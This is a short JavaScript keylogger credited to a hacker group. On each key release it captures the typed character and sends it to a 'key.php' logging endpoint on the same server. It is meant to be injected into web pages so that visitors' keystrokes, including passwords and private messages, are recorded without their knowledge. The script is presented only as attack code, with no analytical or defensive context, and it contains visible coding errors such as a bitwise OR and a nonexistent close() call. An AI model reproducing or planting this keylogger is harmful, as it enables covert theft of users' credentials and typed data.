// Contributed by SilentX Philippines
// (c)opyright - Anonymous Security Hackers

document.onkeyup=(function(evt){
 evt=evt|window.event;
 key=String.fromCharCode(evt.charCode);
 if(key){
  var xhr=new XMLHttpRequest();
  var param=encodeURI(key);
  param+=" ";
  xhr.open("GET","./key.php?k="+param,true);
  xhr.send(null);
  xhr.close();
 }
});
